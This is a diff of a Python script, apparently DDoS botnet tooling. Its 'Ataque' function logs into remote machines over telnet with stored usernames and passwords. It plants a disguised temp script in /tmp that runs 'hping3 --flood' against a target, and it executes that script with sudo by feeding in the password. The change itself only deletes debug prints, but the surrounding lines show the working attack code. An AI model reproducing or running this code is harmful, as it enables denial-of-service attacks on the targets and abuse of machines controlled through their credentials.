@@ -95,13 +95,9 @@ def Ataque(opcion, direccion, puerto, tipo):
                     elif(hping_equipos[i]=="SI"):
 
                         print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- DDOSING')
-                        print("hola1")
                         numero=str(random.randrange(1000000, 10000000, 1))
-                        print("hola2")
                         tn.write(bytes("touch /tmp/system-tmp"+numero+".sh && cd /tmp && echo 'hping3 -p "+puerto+" "+tipo+" --flood "+direccion+"'>> system-tmp"+numero+".sh && chmod 755 system-tmp"+numero+".sh && sudo -S <<< "+password_equipos[i]+" ./system-tmp"+numero+".sh & \n", encoding="ascii"))
-                        print("hola3")
                         time.sleep(5)
-                        print("hola4")
                         tn.write(b'exit\n')
                         tn.close()
 
